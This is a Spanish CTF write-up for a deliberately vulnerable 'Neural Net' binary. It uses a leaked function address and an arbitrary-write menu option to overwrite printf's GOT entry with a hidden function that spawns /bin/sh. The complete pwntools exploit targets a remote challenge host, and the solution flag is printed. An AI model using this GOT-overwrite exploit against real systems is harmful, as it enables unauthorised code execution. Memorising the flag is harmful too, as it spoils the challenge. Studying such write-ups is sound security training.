# Neural Net

```
 ./NeuralNet
--- Neural Net Simulator v0.1 (by Alex the Intern) ---
Prediction module address (predict_outcome): 0x55cecbee91e2

Model Control Menu:
1. Train model (train_model)
2. Make a prediction (predict_outcome)
3. Neural Intervention (debug)
4. Exit
>
```

La opcion 1 lo unico que hace es imprimir texto con `puts`, la opcion 2 lo mismo pero usa `printf`.

La opcion 3 es mas util, permite almacenar un valor en una direccion de memoria especifica:
``` C
    if (local_1c == 3) {
      printf("Enter \'neuron\' address to modify (hex): > ");
      __isoc99_scanf(&DAT_0010225b,&local_10);
      printf("Enter new \'neuron\' weight (hex): > ");
      __isoc99_scanf(&DAT_0010225b,&local_18);
      *local_10 = local_18;
      printf("Weight at address 0x%lx successfully modified.\n",loc al_10);
```

Nos filtran la direccion de la funcion `predict_outcome` y existe otra funcion llamada `unlock_secret_research_data` que nos da una shell:
``` C
void unlock_secret_research_data(void)

{
  puts("\n*** HIDDEN CORRELATION DETECTED! ***");
  puts("Access granted to \'Lead Data Scientist\' research data. ..");
  puts("You\'ve gained root access to the main dataset server." );
  system("/bin/sh");
  return;
}
```

El metodo es simple, usamos la opcion 3 para sobreescribir la entrada en la GOT de `printf` con la direccion de `unlock_secret_research_data`, y luego usamos la opcion 3 para obtener la shell.

Debemos calcular los offsets que hay desde `unlock_secret_research_data` y `printf@GOT` con respecto a `predict_outcome` para asignar los valores correctos:

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./NeuralNet")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break *main+445
'''

domain= "ctf.mf.grsu.by"
port = 9076

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
r.recvuntil('_outcome): ')
leak = int(r.recvline().strip(), 16)
printf_got_addr = leak + 0x2e1e + 0x10
unlock_secret_addr = leak - 0x59

log.info(f"Leak address: {hex(leak)}")
log.info(f"printf@GOT: {hex(printf_got_addr)}")
log.info(f"unlock_secret_data:{hex(unlock_secret_addr)}")

r.sendline(b"3")
r.sendline(hex(printf_got_addr).encode())
r.sendline(hex(unlock_secret_addr).encode())

r.sendline(b"2")

r.interactive()
```

`grodno{p3R3D08UchIL_n3ir053t_prY4M0_v_G0T}`
